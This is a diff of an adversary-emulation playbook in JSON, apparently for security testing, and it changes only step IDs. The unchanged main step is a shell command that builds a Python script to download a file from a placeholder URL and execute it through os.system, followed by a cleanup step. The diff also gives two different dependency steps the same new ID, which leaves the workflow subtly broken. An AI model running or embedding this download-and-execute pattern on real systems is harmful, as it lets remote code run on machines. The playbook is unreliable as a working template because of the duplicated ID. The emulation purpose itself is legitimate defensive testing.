@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "0dd05b60-ab58-46ef-a074-88492d6cfdf9",
+      "id": "9f042f8b-126d-5188-8c2c-a5703eb577fc",
       "type": "execute-command",
       "data": {
         "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' \u003e #{python_script_name}\necho 'import os' \u003e\u003e #{python_script_name}\necho 'url = \"#{script_url}\"' \u003e\u003e #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' \u003e\u003e #{python_script_name}\necho 'session = requests.session()' \u003e\u003e #{python_script_name}\necho 'source = session.get(url).content' \u003e\u003e #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' \u003e\u003e #{python_script_name}\necho 'fd.write(source)' \u003e\u003e #{python_script_name}\necho 'fd.close()' \u003e\u003e #{python_script_name}\necho 'os.system(malicious_command)' \u003e\u003e #{python_script_name}\n$which_python #{python_script_name}",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "a6ce534a-9527-48d7-bf72-87eb8311a8a8",
+      "id": "96711670-dd6b-52f4-9489-d2d994f0f577",
       "type": "execute-command",
       "data": {
         "command": "rm #{python_script_name} #{payload_file_name}",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "cc5c8371-ef42-4d4e-8fb9-c7a1d631f22b",
+      "id": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "name": "Check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "c576312b-38bb-4bd8-8783-4796dc5322b8",
+      "id": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba",
       "name": "Resolve dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "b7d2e487-a78f-469e-9885-c4550ded4e3e",
+      "id": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "name": "Re-check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "0dd05b60-ab58-46ef-a074-88492d6cfdf9",
+      "s": "9f042f8b-126d-5188-8c2c-a5703eb577fc",
       "p": "on-success",
-      "o": "a6ce534a-9527-48d7-bf72-87eb8311a8a8"
+      "o": "96711670-dd6b-52f4-9489-d2d994f0f577"
     },
     {
-      "s": "0dd05b60-ab58-46ef-a074-88492d6cfdf9",
+      "s": "9f042f8b-126d-5188-8c2c-a5703eb577fc",
       "p": "on-failure",
-      "o": "a6ce534a-9527-48d7-bf72-87eb8311a8a8"
+      "o": "96711670-dd6b-52f4-9489-d2d994f0f577"
     },
     {
-      "s": "cc5c8371-ef42-4d4e-8fb9-c7a1d631f22b",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-success",
-      "o": "0dd05b60-ab58-46ef-a074-88492d6cfdf9"
+      "o": "9f042f8b-126d-5188-8c2c-a5703eb577fc"
     },
     {
-      "s": "cc5c8371-ef42-4d4e-8fb9-c7a1d631f22b",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-failure",
-      "o": "c576312b-38bb-4bd8-8783-4796dc5322b8"
+      "o": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba"
     },
     {
-      "s": "c576312b-38bb-4bd8-8783-4796dc5322b8",
+      "s": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba",
       "p": "on-success",
-      "o": "b7d2e487-a78f-469e-9885-c4550ded4e3e"
+      "o": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54"
     },
     {
-      "s": "b7d2e487-a78f-469e-9885-c4550ded4e3e",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-failure",
-      "o": "0dd05b60-ab58-46ef-a074-88492d6cfdf9"
+      "o": "9f042f8b-126d-5188-8c2c-a5703eb577fc"
     }
   ],
   "tags": [
